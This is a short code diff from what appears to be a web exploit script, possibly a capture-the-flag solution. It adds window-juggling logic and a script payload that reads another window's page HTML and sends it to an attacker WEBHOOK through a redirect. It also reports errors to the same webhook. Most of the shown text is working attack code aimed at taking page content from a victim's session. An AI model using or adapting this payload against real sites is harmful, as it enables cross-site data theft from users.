@@ -16,7 +16,18 @@ function post(url, data) {
 }
 
 try {
-  window.open(WEBHOOK + "?open");
+  const id = url.searchParams.get("id");
+  if (id === "1") {
+    window.open(PROFILE, "first");
+    const me = window.open(ORIGIN + "?id=2", "first");
+    setTimeout(() => (me.location = PROFILE), 5000);
+  } else if (id === "2") {
+    const payload = `<script>
+const content = window.open('', 'first').document.body.innerHTML;
+window.location="${WEBHOOK}?" + content;
+</script>`;
+    document.getElementById("login").submit();
+  }
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
